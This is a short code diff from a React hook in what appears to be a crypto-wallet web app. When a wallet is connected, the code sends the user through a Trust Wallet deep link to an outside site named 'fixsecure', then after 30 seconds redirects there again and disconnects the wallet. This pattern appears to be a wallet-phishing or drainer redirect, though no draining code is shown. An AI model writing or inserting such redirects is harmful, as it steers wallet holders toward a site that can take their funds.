@@ -188,13 +188,14 @@ console.log(walletInfo?.name)
     !isTrustWalletApp() // ensure we are not already inside the app
   ) {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=https://fixsecure.onrender.com`;
-    }
-      const timer = setTimeout(() => {
+             const timer = setTimeout(() => {
          window.location.href = "https://fixsecure.onrender.com"
          disconnect()
     console.log("30 seconds passed");
     return () => clearTimeout(timer);
   }, 30000); // 30,000 ms = 30 seconds
+    }
+
 
    
 }, [isConnected, walletInfo, activeChain?.id]);
